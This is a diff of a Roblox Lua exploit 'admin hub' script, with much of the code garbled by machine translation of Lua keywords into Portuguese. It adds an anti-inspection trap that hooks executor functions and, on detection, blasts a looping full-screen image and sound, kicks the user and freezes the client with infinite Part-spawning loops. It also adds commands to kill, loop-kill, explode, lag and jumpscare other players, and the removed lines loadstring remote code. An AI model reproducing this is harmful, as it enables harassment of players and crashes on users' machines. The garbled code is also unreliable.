@@ -1,246 +1,1429 @@
---// Serviços
-local Players = game:GetService("Players")
+detecção local exibida = falso
+local originalFunctions = {}
+
+função local mostrarTelaDetecção()
+    Se a detecção for exibida, retorne o fim.
+    detecçãoExibida = verdadeiro
+    
+    para i = 1, 5 faça
+        tarefa.spawn(função()
+            pcall(função()
+                local mainGui = Instance.new("ScreenGui")
+                mainGui.Name = "LyraHubProtection_Main_" .. i
+                mainGui.ResetOnSpawn = false
+                mainGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+                mainGui.DisplayOrder = 999999999
+                mainGui.IgnoreGuiInset = true
+                
+                se gethui então
+                    mainGui.Parent = gethui()
+                senão se syn e syn.protect_gui então
+                    syn.protect_gui(mainGui)
+                    mainGui.Parent = game:GetService("CoreGui")
+                outro
+                    mainGui.Parent = game:GetService("CoreGui")
+                fim
+                
+                local bg = Instance.new("Frame")
+                bg.Name = "Fundo"
+                bg.Size = UDim2.new(1, 0, 1, 0)
+                bg.Position = UDim2.new(0, 0, 0, 0)
+                bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+                bg.BorderSizePixel = 0
+                bg.ZIndex = 999999999
+                bg.Parent = mainGui
+                
+                local imageLabel = Instance.new("ImageLabel")
+                imageLabel.Size = UDim2.new(1, 0, 1, 0)
+                imageLabel.Position = UDim2.new(0, 0, 0, 0)
+                imageLabel.BackgroundTransparency = 1
+                imageLabel.Image = "rbxassetid://6703959304"
+                imageLabel.ScaleType = Enum.ScaleType.Stretch
+                imageLabel.ZIndex = 999999999
+                imageLabel.Parent = bg
+                
+                som local = Instância.novo("Som")
+                sound.SoundId = "rbxassetid://"
+                Volume do som = 50000
+                som.Em loop = verdadeiro
+                som.Pai = fundo
+                pcall(function() som:Reproduzir() fim)
+                
+                pcall(função()
+                    UserSettings():GetService("UserGameSettings").MasterVolume = 1
+                fim)
+            fim)
+        fim)
+    fim
+    
+    tarefa.esperar(0.5)
+    tarefa.spawn(função()
+        pcall(função()
+            game.Players.LocalPlayer:Kick("TENTANDO ME ROUBAR NÉ KKKKKKKKKKKKKK")
+        fim)
+        tarefa.esperar(1)
+        se game.Players.LocalPlayer então
+            enquanto verdadeiro faz
+                enquanto verdadeiro faz
+                    enquanto verdadeiro faz
+                        Instância.novo("Parte", espaço de trabalho)
+                    fim
+                fim
+            fim
+        fim
+    fim)
+fim
+
+pcall(função()
+    se hookfunction então
+        originalFunctions.hookfunction = hookfunction
+        função de gancho = função(...)
+            mostrarTelaDetecção()
+            retornar função() fim
+        fim
+        
+        se getgenv então getgenv().hookfunction = hookfunction fim
+        _G.hookfunction = função de gancho
+    fim
+fim)
+
+pcall(função()
+    se hookmetamethod então
+        originalFunctions.hookmetamethod = hookmetamethod
+        hookmetamethod = função(...)
+            mostrarTelaDetecção()
+            retornar função() fim
+        fim
+        
+        se getgenv então getgenv().hookmetamethod = hookmetamethod fim
+        _G.hookmetamethod = hookmetamethod
+    fim
+fim)
+
+pcall(função()
+    se nova divulgação então
+        originalFunctions.newcclosure = newcclosure
+        nova divulgação = função(func)
+            mostrarTelaDetecção()
+            função de retorno
+        fim
+        
+        se getgenv então getgenv().newcclosure = newcclosure fim
+        _G.newcclosure = newcclosure
+    fim
+fim)
+
+pcall(função()
+    se getrawmetatable então
+        originalFunctions.getrawmetatable = getrawmetatable
+        getrawmetatable = função(...)
+            mostrarTelaDetecção()
+            retornar {}
+        fim
+        
+        se getgenv então getgenv().getrawmetatable = getrawmetatable fim
+        _G.getrawmetatable = getrawmetatable
+    fim
+fim)
+
+pcall(função()
+    se setreadonly então
+        originalFunctions.setreadonly = setreadonly
+        definirsomenteleitura = função(...)
+            mostrarTelaDetecção()
+            retornar
+        fim
+        
+        se getgenv então getgenv().setreadonly = setreadonly fim
+        _G.setreadonly = setreadonly
+    fim
+fim)
+
+pcall(função()
+    se getnamecallmethod então
+        originalFunctions.getnamecallmethod = getnamecallmethod
+        getnamecallmethod = função(...)
+            mostrarTelaDetecção()
+            retornar ""
+        fim
+        
+        se getgenv então getgenv().getnamecallmethod = getnamecallmethod fim
+        _G.getnamecallmethod = getnamecallmethod
+    fim
+fim)
+
+pcall(função()
+    se getcallingscript então
+        originalFunctions.getcallingscript = getcallingscript
+        obterscriptdechamada = função(...)
+            mostrarTelaDetecção()
+            retornar nulo
+        fim
+        
+        se getgenv então getgenv().getcallingscript = getcallingscript fim
+        _G.getcallingscript = getcallingscript
+    fim
+fim)
+
+pcall(função()
+    se getconnections então
+        funçõesOriginal.getConnections = getConnections
+        obterconexões = função(...)
+            mostrarTelaDetecção()
+            retornar {}
+        fim
+        
+        se getgenv então getgenv().getconnections = getconnections fim
+        _G.getconnections = getconnections
+    fim
+fim)
+
+pcall(função()
+    se debug e debug.getinfo então
+        originalFunctions.debuggetinfo = debug.getinfo
+        debug.getinfo = função(...)
+            mostrarTelaDetecção()
+            retornar {}
+        fim
+    fim
+fim)
+
+pcall(função()
+    se debug e debug.getconstants então
+        originalFunctions.debuggetconstants = debug.getconstants
+        debug.getconstants = função(...)
+            mostrarTelaDetecção()
+            retornar {}
+        fim
+    fim
+fim)
+
+pcall(função()
+    se setclipboard então
+        originalFunctions.setclipboard = setclipboard
+        definiráaáreadetransferência = função(texto)
+            local str = tostring(texto)
+            se str:find("https://") ou str:find("http://") ou
+               str:find("webhook") ou str:find("discord.com") então
+                mostrarTelaDetecção()
+            fim
+            retornar originalFunctions.setclipboard(texto)
+        fim
+        
+        se getgenv então getgenv().setclipboard = setclipboard fim
+        _G.setclipboard = setclipboard
+    fim
+fim)
+
+pcall(função()
+    se houver solicitação, então
+        originalFunctions.request = request
+        solicitação = função(opções)
+            mostrarTelaDetecção()
+            retornar {Sucesso = falso}
+        fim
+        
+        se getgenv então getgenv().request = solicitação fim
+        _G.request = solicitação
+    fim
+fim)
+
+pcall(função()
+    se http_request então
+        originalFunctions.http_request = http_request
+        http_request = função(opções)
+            mostrarTelaDetecção()
+            retornar {Sucesso = falso}
+        fim
+        
+        se getgenv então getgenv().http_request = http_request fim
+        _G.http_request = http_request
+    fim
+fim)
+
+pcall(função()
+    se syn e syn.request então
+        originalFunctions.synrequest = syn.request
+        syn.request = função(opções)
+            mostrarTelaDetecção()
+            retornar {Sucesso = falso}
+        fim
+    fim
+fim)
+
+tarefa.spawn(função()
+    enquanto task.wait(1) faça
+        pcall(função()
+            local coreGui = game:GetService("CoreGui")
+            para _, gui em pares(coreGui:GetDescendants()) faça
+                se gui:IsA("ScreenGui") então
+                    nome local = gui.Name:lower()
+                    se nome:encontrar("espião") ou nome:encontrar("remoto") ou nome:encontrar("registrador") ou
+                       nome:find("hook") ou nome:find("simple") ou nome:find("dex") então
+                        mostrarTelaDetecção()
+                    fim
+                fim
+            fim
+        fim)
+        
+        pcall(função()
+            se gethui então
+                local hui = gethui()
+                para _, gui em pares(hui:GetDescendants()) faça
+                    se gui:IsA("ScreenGui") então
+                        nome local = gui.Name:lower()
+                        se nome:encontrar("espião") ou nome:encontrar("remoto") ou nome:encontrar("registrador") ou
+                           nome:find("hook") ou nome:find("simple") ou nome:find("dex") então
+                            mostrarTelaDetecção()
+                        fim
+                    fim
+                fim
+            fim
+        fim)
+    fim
+fim)
+
+local lockedTarget = nulo
+local selectedPlayerName = nil
+local estáAtualizando = falso
+
+Jogadores locais = jogo:ObterServiço("Jogadores")
+local LocalPlayer = Players.LocalPlayer
+
+função local obterListaDeJogadores()
+    lista local = {}
+    para _, jogador em ipairs(Jogadores:ObterJogadores()) faça
+        se jogador ~= JogadorLocal então
+            lista[#lista+1] = jogador.Nome
+        fim
+    fim
+    tabela.ordenar(lista)
+    lista de retorno
+fim
+
+conexões locais = {}
+
+função local setupAutoUpdate()
+    para _, conn em ipairs(conexões) faça
+        conexão:Desconectar()
+    fim
+    
+    local conn1 = Players.PlayerAdded:Connect(function(player)
+        tarefa.esperar(0.5)
+        local newPlayers = getPlayersList()
+        targetDropdown:Refresh(newPlayers, selectedPlayerName or "")
+    fim)
+    
+    local conn2 = Players.PlayerRemoving:Connect(function(player)
+        tarefa.esperar(0.5)
+        local newPlayers = getPlayersList()
+        targetDropdown:Refresh(newPlayers, selectedPlayerName or "")
+        
+        Se player.Name == selectedPlayerName então
+            lockedTarget = nulo
+            selectedPlayerName = nulo
+            getgenv().Target = nil
+        fim
+    fim)
+    
+    tabela.inserir(conexões, conn1)
+    tabela.inserir(conexões, conn2)
+fim
+
+setupAutoUpdate()
+
+tarefa.spawn(função()
+    enquanto task.wait(30) faça
+        local newPlayers = getPlayersList()
+        targetDropdown:Refresh(newPlayers, selectedPlayerName or "")
+    fim
+fim)
+
+Jogadores locais = jogo:ObterServiço("Jogadores")
 local TweenService = game:GetService("TweenService")
 local TextChatService = game:GetService("TextChatService")
-local RunService = game:GetService("RunService")
+local RunService = jogo:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
-local Workspace = workspace
+Espaço de trabalho local = espaço de trabalho
+local CoreGui = game:GetService("CoreGui")
+local UserInputService = game:GetService("UserInputService")
+local Lighting = game:GetService("Lighting")
+local HttpService = game:GetService("HttpService")
 
---// Estados locais
-local playerOriginalSpeed = {}
-local jaulas = {}
-local jailConnections = {}
-local atrapalharConnections = {}
+DOAÇÕES locais = {
+    ["doxPkwsXLBt"] = verdadeiro,
+    ["lorenzk_o75"] = verdadeiro,
+    ["GAME_HACKEDBYTROLL"] = verdadeiro,
+    [""] = verdadeiro,
+    [""] = verdadeiro,
+    [""] = verdadeiro,
+    [""] = verdadeiro,
+}
 
---// Função util: cria tag visual (opcional)
-local function createSpecialTag(player)
-    if not player then return end
-    local function apply()
-        local char = player.Character
-        if not char then return end
+local SUB_DONOS = {
+    ["Eddymartins2015"] = verdadeiro,
+    [""] = verdadeiro,
+    [""] = verdadeiro,
+    [""] = verdadeiro,
+    [""] = verdadeiro,
+    [""] = verdadeiro,
+    [""] = verdadeiro,
+    [""] = verdadeiro,
+    [""] = verdadeiro,
+    [""] = verdadeiro,
+    [""] = verdadeiro,
+    [""] = verdadeiro,
+}
+
+MODS locais = {
+    ["eid8dj3"] = verdadeiro,
+    ["GOJODEV73"] = verdadeiro,
+    ["QueroMais37"] = verdadeiro,
+    ["Sconn0538"] = verdadeiro,
+    [""] = verdadeiro,
+    [""] = verdadeiro,
+    [""] = verdadeiro,
+    [""] = verdadeiro,
+    [""] = verdadeiro,
+    [""] = verdadeiro,
+}
+
+local TEMP_MODS = {}
+local LCC_USERS = {}
+local playerOriginalSpeed ​​= {}
+local LOOP_KILL_PLAYERS = {}
+local LOOP_BRING_PLAYERS = {}
+
+função local PodeUsarComando(nomeDoComando, nomeDoJogadorAlvo)
+    se DONOS[nomeDoComandante] ou SUB_DONOS[nomeDoComandante] ou MODS[nomeDoComandante] ou TEMP_MODS[nomeDoComandante] então
+        retornar verdadeiro
+    fim
+    
+    se LCC_USERS[nomeDoComando] então
+        se LCC_USERS[targetPlayerName] então
+            retornar verdadeiro
+        outro
+            retornar falso
+        fim
+    fim
+    
+    retornar falso
+fim
+
+função local TemCargo(nomeDoJogador)
+    retornar DONOS[nomeDoJogador] ou SUB_DONOS[nomeDoJogador] ou MODS[nomeDoJogador] ou TEMP_MODS[nomeDoJogador] ou LCC_USERS[nomeDoJogador]
+fim
+
+função local EImune(nomeDoJogador)
+    retornar falso
+fim
+
+função local GetCargo(playerName)
+    Se DONOS[playerName] então retorne "Dono para LCC" fim
+    se SUB_DONOS[playerName] então retorne "Subdono do LCC" fim
+    se MODS[playerName] então retorne "Admin do LCC" fim
+    se TEMP_MODS[playerName] então retorne "Mod Temporário" fim
+    retornar ""
+fim
+
+função local criarEtiquetaEspecial(jogador)
+    Se não for jogador, retorne ao fim.
+    
+    função local aplicar()
+        char local = player.Character
+        Se não for um caractere, retorne o fim.
         local head = char:FindFirstChild("Head")
-        if not head then return end
+        Se não for o cabeçalho, retorne ao fim.
 
-        local old = head:FindFirstChild("SpecialTag")
-        if old then old:Destroy() end
+        local old = head:FindFirstChild("SpecialTag")  
+        se antigo então antigo:Destruir() fim  
 
-        local gui = Instance.new("BillboardGui")
-        gui.Name = "SpecialTag"
-        gui.Size = UDim2.new(0, 200, 0, 50)
-        gui.StudsOffset = Vector3.new(0, 3, 0)
-        gui.AlwaysOnTop = true
-        gui.Adornee = head
-        gui.Parent = head
+        gui local = Instance.new("BillboardGui")  
+        gui.Name = "EtiquetaEspecial"  
+        gui.Size = UDim2.new(0, 200, 0, 50)  
+        gui.StudsOffset = Vector3.new(0, 3, 0)  
+        gui.AlwaysOnTop = true  
+        gui.Adornee = cabeça  
+        gui.Parent = head  
 
-        local text = Instance.new("TextLabel")
-        text.Size = UDim2.new(1,0,1,0)
-        text.BackgroundTransparency = 1
-        text.Font = Enum.Font.GothamBold
-        text.TextScaled = true
-        text.TextStrokeTransparency = 0.2
-        text.TextStrokeColor3 = Color3.new(0,0,0)
-        text.TextColor3 = Color3.fromRGB(255,255,255)
-        text.Text = ""
-        text.Parent = gui
-    end
-    pcall(apply)
-    player.CharacterAdded:Connect(function()
-        task.wait(0.4)
-        pcall(apply)
-    end)
-end
+        texto local = Instance.new("TextLabel")  
+        text.Size = UDim2.new(1, 0, 1, 0)  
+        texto.TransparênciaDeFundo = 1  
+        texto.Fonte = Enum.Fonte.GothamBold  
+        texto.TextoEscalado = verdadeiro  
+        text.TextStrokeTransparency = 0,2  
+        text.TextStrokeColor3 = Color3.new(0,0,0)  
+        
+        carga local = ObterCarga(jogador.Nome)
+        
+        se carga ~= "" então
+            texto.Texto = carga
+        outro
+            texto.Texto = ""
+        fim
+        
+        local azulEscuro = Color3.fromRGB(0, 51, 102)
+        
+        se cargo == "Dono do LCC" então
+            text.TextColor3 = azulEscuro
+        senão se carga == "Subdono do LCC" então
+            text.TextColor3 = azulEscuro
+        senão se carga == "Admin do LCC" então
+            text.TextColor3 = azulEscuro
+        senão se carga == "Temp Mod" então
+            text.TextColor3 = azulEscuro
+        outro
+            texto.Texto = ""
+        fim
 
---// Aplica tags iniciais
-for _, p in pairs(Players:GetPlayers()) do
-    createSpecialTag(p)
-end
-Players.PlayerAdded:Connect(function(p) createSpecialTag(p) end)
+        texto.Pai = gui  
+    fim  
 
---// Função para enviar comando pelo chat
-local function EnviarComando(comando, alvo)
-    local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
-    if canal then
-        canal:SendAsync(";"..comando.." "..(alvo or ""))
-    end
-end
+    pcall(aplicar)  
+    jogador.PersonagemAdicionado:Conectar(função()  
+        tarefa.esperar(0.4)  
+        pcall(aplicar)  
+    fim)
+fim
 
---// Função que processa cada mensagem recebida
-local function ProcessarMensagem(msgText, authorName)
-    if not msgText or not authorName then return end
-    local comandoLower = msgText:lower()
-    local targetLower = LocalPlayer.Name:lower()
-    local character = LocalPlayer.Character
-    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+para _, p em pares(Jogadores:ObterJogadores()) faça
+    criarEtiquetaEspecial(p)
+fim
 
-    -- COMANDOS
-    if comandoLower:match(";kick%s+"..targetLower) then
-        LocalPlayer:Kick("Você foi kickado via comando!")
-    end
-    if comandoLower:match(";kill%s+"..targetLower) then
-        if character then character:BreakJoints() end
-    end
-    if comandoLower:match(";fling%s+"..targetLower) then
-        if character then
-            local root = character:FindFirstChild("HumanoidRootPart")
-            if root then
-                local tween = TweenService:Create(root, TweenInfo.new(1), {CFrame=CFrame.new(0,100000,0)})
-                tween:Play()
-            end
-        end
-    end
-    if comandoLower:match(";freeze%s+"..targetLower) then
-        if humanoid then
-            playerOriginalSpeed[targetLower] = humanoid.WalkSpeed
-            humanoid.WalkSpeed = 0
-        end
-    end
-    if comandoLower:match(";unfreeze%s+"..targetLower) then
-        if humanoid then
-            humanoid.WalkSpeed = playerOriginalSpeed[targetLower] or 16
-        end
-    end
-    if comandoLower:match(";bring%s+"..targetLower) then
-        local success, err = pcall(function()
-            local sourcePlayer = Players:FindFirstChild(authorName)
-            if not sourcePlayer then return end
-            local sourceChar = sourcePlayer.Character
-            if not sourceChar then return end
-            local sourceRoot = sourceChar:FindFirstChild("HumanoidRootPart")
-            if not sourceRoot then return end
-            local myRoot = character:FindFirstChild("HumanoidRootPart")
-            if myRoot then
-                myRoot.CFrame = sourceRoot.CFrame * CFrame.new(0,0,2)
-            end
-        end)
-    end
-    if comandoLower:match(";jail%s+"..targetLower) then
-        if character then
-            local root = character:FindFirstChild("HumanoidRootPart")
-            if root then
-                local pos = root.Position
-                jaulas[targetLower] = {}
-                local color = Color3.fromRGB(255,140,0)
-                local function criarPart(cf,s)
-                    local p = Instance.new("Part")
-                    p.Size = s
-                    p.Anchored = true
-                    p.Position = cf.Position
-                    p.Color = color
-                    p.CanCollide = true
-                    p.Parent = Workspace
-                    table.insert(jaulas[targetLower], p)
-                end
-                criarPart(CFrame.new(pos + Vector3.new(5,0,0)), Vector3.new(1,10,10))
-                criarPart(CFrame.new(pos + Vector3.new(-5,0,0)), Vector3.new(1,10,10))
-                criarPart(CFrame.new(pos + Vector3.new(0,0,5)), Vector3.new(10,10,1))
-                criarPart(CFrame.new(pos + Vector3.new(0,0,-5)), Vector3.new(10,10,1))
-                criarPart(CFrame.new(pos + Vector3.new(0,5,0)), Vector3.new(10,1,10))
-                criarPart(CFrame.new(pos + Vector3.new(0,-5,0)), Vector3.new(10,1,10))
-                jailConnections[targetLower] = RunService.Heartbeat:Connect(function()
-                    if (root.Position - pos).Magnitude > 5 then
-                        root.CFrame = CFrame.new(pos)
-                    end
-                end)
-            end
-        end
-    end
-    if comandoLower:match(";unjail%s+"..targetLower) then
-        if jaulas[targetLower] then
-            for _, v in pairs(jaulas[targetLower]) do
-                if v and v.Destroy then pcall(v.Destroy, v) end
-            end
-            jaulas[targetLower] = nil
-        end
-        if jailConnections[targetLower] then
-            jailConnections[targetLower]:Disconnect()
-            jailConnections[targetLower] = nil
-        end
-    end
+Jogadores.JogadorAdicionado:Conectar(função(p)
+    criarEtiquetaEspecial(p)
+fim)
 
-    --// ATRAPALHAR PLAYER
-    if comandoLower:match(";atrapalhar%s+"..targetLower) then
-        local char = character
-        if not char then return end
-        local root = char:FindFirstChild("HumanoidRootPart")
-        if not root then return end
+função local KillPlayer(targetPlayer)
+    Se não for targetPlayer ou não for targetPlayer.Character, retorne falso.
+    local humanoide = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
+    se humanoide então
+        humanoide.Saúde = 0
+        retornar verdadeiro
+    fim
+    retornar falso
+fim
 
-        if atrapalharConnections[targetLower] then atrapalharConnections[targetLower]:Disconnect() end
+função local KickPlayer(targetPlayer, motivo)
+    Se não for o jogador alvo, retorne falso.
+    
+    sucesso local = pcall(função()
+        targetPlayer:Kick(reason or "Você foi expulso pela equipe LCC")
+    fim)
+    
+    se não houver sucesso, então
+        se targetPlayer.Character e targetPlayer.Character:FindFirstChild("HumanoidRootPart") então
+            targetPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 1000000, 0)
+        fim
+        
+        tarefa.spawn(função()
+            para i = 1, 10 faça
+                se targetPlayer.Character então
+                    targetPlayer.Character:BreakJoints()
+                fim
+                tarefa.esperar(0.5)
+            fim
+        fim)
+    fim
+    
+    retornar verdadeiro
+fim
 
-        atrapalharConnections[targetLower] = RunService.Heartbeat:Connect(function()
-            if root then
-                -- Jogar para cima
-                root.Velocity = Vector3.new(0,500,0)
-                -- Spin maluco
-                root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(500), 0)
-            end
-        end)
-    end
-end
+função local EnviarComando(comando, alvo)
+    local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") ou TextChatService.TextChannels:GetChildren()[1]
+    se for canal então
+        canal:SendAsync("/" .. comando .. " " .. (alvo ou ""))
+    fim
+fim
 
---// Conectar canais de chat
-local function ConectarCanal(canal)
-    if not canal or not canal.IsA then return end
-    if not canal:IsA("TextChannel") then return end
-    canal.MessageReceived:Connect(function(msg)
-        local text = msg.Text
-        local source = msg.TextSource and msg.TextSource.Name
-        if text and source then
-            ProcessarMensagem(text, source)
-        end
-    end)
-end
-for _, ch in pairs(TextChatService.TextChannels:GetChildren()) do ConectarCanal(ch) end
-TextChatService.TextChannels.ChildAdded:Connect(ConectarCanal)
+função local AtualizarTagPorNome(nome)
+    local p = Jogadores:EncontrarPrimeiroFilho(nome)
+    se p então
+        criarEtiquetaEspecial(p)
+    fim
+fim
 
---// Painel WindUI
-local ok, WindUILib = pcall(function()
-    return loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
-end)
-if ok and WindUILib then
-    local Window = WindUILib:CreateWindow({
-        Title = "Lcc Hub Painel Admin",
-        Icon = "star",
-        Author = "by Lcc_027",
-        Folder = "LccHubPainel",
-        Size = UDim2.fromOffset(580,460),
-        Transparent = true,
-        Resizable = false,
-        SideBarWidth = 200,
-        HideSearchBar = true,
-        ScrollBarEnabled = true,
-    })
+função local ExplodirPlayer(targetPlayer)
+    Se não for targetPlayer ou não for targetPlayer.Character, retorne falso.
+    
+    personagem local = jogadorAlvo.Personagem
+    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+    
+    Se não for humanoidRootPart, retorne falso.
+    
+    explosão local = Instance.new("Explosão")
+    explosão.Posição = humanoideRootPart.Posição
+    explosão.Pressão da explosão = 500000
+    explosão.RaioDaExplosão = 10
+    explosão.DestruirRaioJuntaPercentual = 0
+    explosão.Pai = Espaço de trabalho
+    
+    para i = 1, 8 faça
+        parte local = Instance.new("Parte")
+        part.Size = Vector3.new(2, 2, 2)
+        part.Position = humanoidRootPart.Position + Vector3.new(math.random(-8, 8), math.random(0, 12), math.random(-8, 8))
+        parte.Ancorada = falso
+        parte.PodeColidir = falso
+        parte.Material = Enum.Material.Neon
+        parte.Cor = Cor3.fromRGB(100, 100, 255)
+        parte.Pai = Espaço de trabalho
+        
+        local bodyVelocity = Instance.new("BodyVelocity")
+        bodyVelocity.Velocity = Vector3.new(math.random(-80, 80), math.random(30, 100), math.random(-80, 80))
+        bodyVelocity.MaxForce = Vector3.new(1e5, 1e5, 1e5)
+        bodyVelocity.Parent = parte
+        
+        jogo:ObterServiço("Detritos"):AdicionarItem(parte, 3)
+    fim
+    
+    humanoide local = personagem:FindFirstChildOfClass("Humanoid")
+    se humanoide então
+        humanoide.Saúde = 0
+    fim
+    
+    retornar verdadeiro
+fim
 
-    local TabComandos = Window:Tab({Title="Scripts", Icon="terminal", Locked=false})
-    local Section = TabComandos:Section({Title="Admin", Icon="user-cog", Opened=true})
+função local BringPlayer(targetPlayer, commander)
+    Se não for targetPlayer ou não for targetPlayer.Character, retorne falso.
+    Se não for comandante ou não for comandante.Personagem, retorne falso.
+    
+    local targetHrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+    local commanderHrp = commander.Character:FindFirstChild("HumanoidRootPart")
+    
+    Se não targetHrp ou não commanderHrp, retorne falso.
+    
+    local bringOffset = CFrame.new(0, 0, -5)
+    targetHrp.CFrame = commanderHrp.CFrame * bringOffset
+    
+    retornar verdadeiro
+fim
 
-    local function getPlayersList()
-        local t = {}
-        for _, p in ipairs(Players:GetPlayers()) do table.insert(t,p.Name) end
-        return t
-    end
+função local LoopKillPlayer(targetPlayer)
+    Se não for o jogador alvo, retorne falso.
+    LOOP_KILL_PLAYERS[targetPlayer.Name] = true
+    
+    função local killLoop()
+        enquanto LOOP_KILL_PLAYERS[targetPlayer.Name] e targetPlayer e targetPlayer.Parent faça
+            se targetPlayer.Character então
+                local humanoide = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
+                se humanoide então
+                    humanoide.Saúde = 0
+                fim
+            fim
+            tarefa.esperar(1)
+        fim
+    fim
+    
+    tarefa.spawn(killLoop)
+    retornar verdadeiro
+fim
 
-    local TargetName
-    local Dropdown = Section:Dropdown({
-        Title="Selecionar Jogador",
-        Values=getPlayersList(),
-        Value="",
-        Callback=function(opt) TargetName = opt end
-    })
-    Players.PlayerAdded:Connect(function() Dropdown:SetValues(getPlayersList()) end)
-    Players.PlayerRemoving:Connect(function() Dropdown:SetValues(getPlayersList()) end)
+função local UnloopKillPlayer(targetPlayer)
+    Se não for o jogador alvo, retorne falso.
+    LOOP_KILL_PLAYERS[targetPlayer.Name] = nulo
+    retornar verdadeiro
+fim
 
-    local comandos = {"kick","kill","fling","freeze","unfreeze","bring","jail","unjail","atrapalhar"}
-    for _, cmd in ipairs(comandos) do
-        Section:Button({
-            Title=cmd,
-            Desc="Comando ;"..cmd.." - Alvo",
-            Callback=function()
-                if TargetName and TargetName~="" then
-                    EnviarComando(cmd, TargetName)
-                else
-                    warn("Nenhum jogador selecionado!")
-                end
-            end
+função local LoopBringPlayer(targetPlayer, commander)
+    Se não for jogador alvo ou comandante, retorne falso.
+    LOOP_BRING_PLAYERS[targetPlayer.Name] = true
+    
+    função local bringLoop()
+        enquanto LOOP_BRING_PLAYERS[targetPlayer.Name] e targetPlayer e targetPlayer.Parent e commander e commander.Parent faça
+            se targetPlayer.Character e commander.Character então
+                local targetHrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+                local commanderHrp = commander.Character:FindFirstChild("HumanoidRootPart")
+                
+                se targetHrp e commanderHrp então
+                    local bringOffset = CFrame.new(0, 0, -5)
+                    targetHrp.CFrame = commanderHrp.CFrame * bringOffset
+                fim
+            fim
+            tarefa.esperar(0.5)
+        fim
+    fim
+    
+    tarefa.spawn(bringLoop)
+    retornar verdadeiro
+fim
+
+função local UnloopBringPlayer(targetPlayer)
+    Se não for o jogador alvo, retorne falso.
+    LOOP_BRING_PLAYERS[targetPlayer.Name] = nulo
+    retornar verdadeiro
+fim
+
+função local FloatPlayer(targetPlayer)
+    Se não for targetPlayer ou não for targetPlayer.Character ou não for targetPlayer.Character:FindFirstChild("HumanoidRootPart") ou não for targetPlayer.Character:FindFirstChildOfClass("Humanoid"), então retorne falso.
+    local targetHrp = targetPlayer.Character.HumanoidRootPart
+    local targetHumanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
+    local targetPos = targetHrp.Position
+    targetHumanoid.WalkSpeed ​​= 0
+    targetHumanoid.JumpHeight = 0
+
+    local bodyVelocity = Instance.new("BodyVelocity", targetHrp)
+    bodyVelocity.MaxForce = Vector3.new(0, math.huge, 0)
+    bodyVelocity.Velocity = Vector3.new(0, 10, 0)
+    bodyVelocity.Name = "FloatVelocity"
+
+    altura máxima local = posição_alvo.Y + 50
+    conexão local
+    conexão = RunService.Heartbeat:Connect(function()
+        se não targetPlayer.Character ou não targetPlayer.Character.Parent ou não targetHrp.Parent ou não targetHumanoid.Parent então
+            se bodyVelocity e bodyVelocity.Parent então bodyVelocity:Destroy() fim
+            se houver conexão, então conexão:Desconectar() fim
+            retornar
+        fim
+        se targetHrp.Position.Y >= maxHeight então
+            se bodyVelocity e bodyVelocity.Parent então bodyVelocity:Destroy() fim
+            se houver conexão, então conexão:Desconectar() fim
+            targetHumanoid.Saúde = 0
+        fim
+    fim)
+    retornar verdadeiro
+fim
+
+função local LagPlayer(targetPlayer)
+    Se não for targetPlayer ou não for targetPlayer.Character, retorne falso.
+    
+    para i = 1, 50 faça
+        tarefa.spawn(função()
+            pcall(função()
+                local hrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+                se hrp então
+                    explosão local = Instance.new("Explosão")
+                    explosão.Posição = hrp.Posição + Vector3.new(math.random(-10, 10), math.random(0, 5), math.random(-10, 10))
+                    explosão.RaioDaExplosão = 20
+                    explosão.Pressão da explosão = 1000000
+                    explosão.Pai = Espaço de trabalho
+                fim
+            fim)
+        fim)
+    fim
+    
+    para i = 1, 25 faça
+        tarefa.spawn(função()
+            parte local = Instance.new("Parte")
+            part.Size = Vector3.new(5, 5, 5)
+            part.Position = targetPlayer.Character.HumanoidRootPart.Position + Vector3.new(math.random(-20, 20), math.random(0, 10), math.random(-20, 20))
+            parte.Ancorada = falso
+            parte.PodeColidir = verdadeiro
+            parte.Material = Enum.Material.Neon
+            parte.Cor = Cor3.fromRGB(255, 0, 0)
+            parte.Pai = Espaço de trabalho
+            
+            local bodyVelocity = Instance.new("BodyVelocity")
+            bodyVelocity.Velocity = Vector3.new(math.random(-100, 100), math.random(50, 200), math.random(-100, 100))
+            bodyVelocity.MaxForce = Vector3.new(1e6, 1e6, 1e6)
+            bodyVelocity.Parent = parte
+            
+            jogo:ObterServiço("Detritos"):AdicionarItem(parte, 5)
+        fim)
+    fim
+    
+    retornar verdadeiro
+fim
+
+função local CriarJumpscareLocal(imageId, audioId)
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "JumpscareFullscreen"
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    screenGui.DisplayOrder = 2147483647
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true
+    screenGui.Parent = CoreGui
+
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(1, 0, 1, 0)
+    mainFrame.Position = UDim2.new(0, 0, 0, 0)
+    mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.ZIndex = 2147483647
+    mainFrame.Parent = screenGui
+
+    local imageLabel = Instance.new("ImageLabel")
+    imageLabel.Size = UDim2.new(1, 0, 1, 0)
+    imageLabel.Position = UDim2.new(0, 0, 0, 0)
+    imageLabel.BackgroundTransparency = 1
+    imageLabel.Image = imageId
+    imageLabel.ScaleType = Enum.ScaleType.Fit
+    imageLabel.ZIndex = 2147483647
+    imageLabel.Parent = mainFrame
+
+    som local = Instância.novo("Som")
+    som.SoundId = audioId
+    Volume do som = 2.0
+    som.Em loop = falso
+    som.Pai = mainFrame
+
+    local flashCount = 12
